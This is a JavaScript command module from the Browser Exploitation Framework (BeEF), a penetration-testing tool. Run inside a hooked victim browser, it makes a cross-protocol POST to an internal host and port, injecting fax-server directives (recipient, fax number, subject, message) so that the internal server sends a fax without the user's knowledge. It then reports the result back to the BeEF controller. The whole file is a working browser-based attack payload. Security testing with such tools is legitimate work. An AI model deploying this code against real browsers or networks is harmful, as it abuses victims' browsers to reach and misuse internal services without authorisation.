//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var target_ip = "<%= @ip %>";
	var target_port = "<%= @port %>";
	var recname = "<%= @recname %>";
	var recfax = "<%= @recfax %>";
	var subject = "<%= @subject %>";
	var msg = "<%= @msg.gsub(/"/, '\\"').gsub(/\r?\n/, '\\n') %>";
	
	var uri = "http://"+target_ip+":"+target_port+"/";
	var post_body = "@F201 "+recname+"@@F211 "+recfax+"@@F307 "+subject+"@@F301 1@\n"+msg;

	var xhr = new XMLHttpRequest();	
	
	xhr.open("POST", uri, true);
	xhr.setRequestHeader("Content-Type", "text/plain");
	xhr.send(post_body);
	setTimeout(function(){xhr.abort()}, 2000);
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');

});

